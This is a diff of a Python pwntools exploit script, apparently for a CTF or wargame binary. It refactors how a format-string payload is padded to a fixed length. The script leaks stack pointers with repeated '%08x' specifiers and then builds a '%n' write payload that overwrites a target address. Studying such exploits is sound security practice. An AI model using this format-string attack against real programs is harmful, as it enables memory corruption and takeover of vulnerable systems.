@@ -44,14 +44,14 @@ log.info('target_addr: %08x', target_addr)
 '''
 
 
-# Always use the same arg length to keep a consistent stack pointer between runs
-def get_fixed_len_fmt(fmt):
-    PAD = 55  # arbitrary, long to always fit everything, increase if necessary
-    return fit({0: fmt + '.', PAD: '\n'})
+# Always use the same arg length to keep a consistent stack pointer between
+# runs. Length is arbitrary but must be long enough to fit everything, increase
+# if necessary.
+ARG_SIZE = 50
 
 
 def leak_stack_ptrs(count):
-    fmt = get_fixed_len_fmt(' '.join('%08x' for i in range(count)))
+    fmt = fit(' '.join('%08x' for i in range(count)), length=ARG_SIZE)
     with s.system([args.BIN, fmt]) as p:
         return [None] + [int(x[:8], 16) for x in p.recv().split(' ')]  # None is $0
 
@@ -80,8 +80,7 @@ log.info('missby:  %dB', missby)
 log.info('padding: %dB', padding)
 log.info('n_idx:   %d', n_idx)
 
-payload = cyclic(padding) + p32(target_addr) + '%' + str(n_idx) + '$n'
-fmt = get_fixed_len_fmt(payload)
+fmt = fit({padding: p32(target_addr) + '%' + str(n_idx) + '$n', ARG_SIZE-1:'\n'})
 with s.system([args.BIN, fmt]) as p:
     p.recvline()
     ret = p.recvline()
